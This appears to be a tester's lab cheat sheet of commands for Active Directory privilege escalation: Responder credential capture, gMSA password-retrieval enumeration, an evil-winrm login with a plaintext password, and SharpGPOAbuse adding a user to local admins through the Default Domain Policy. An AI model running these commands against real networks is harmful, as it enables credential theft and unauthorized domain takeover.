command for responder:

```
responder -I tun0 -wv
```
Powershell commands:

Download files from a url
```
Invoke-WebRequest -Uri <ip address> -Outfile <filename>
```
Checks to see who has gmsa permissions on an AD:
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```

known manual start permissions on windows:
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
```
look for services that start manually
```
Get-Service | findstr -i "manual"
```

Check if user is in an admin group:

```
Get-ADGroupMember 'Web Admins'
```

What groups have permission to acheive a users password:
```
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
```
Winrm command to give access to our folder to run files:
```
evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .

```
Lists GPOs after using PowerView.ps1
```
 Get-NetGPO
```

Check GPO permissions
```
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
```
Runs SharpGPOAbuse.exe to gain permissions:
```
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

updates gp policy:
```
gpupdate /force
```
Shows administrator group:
```
net localgroup Administrators
```
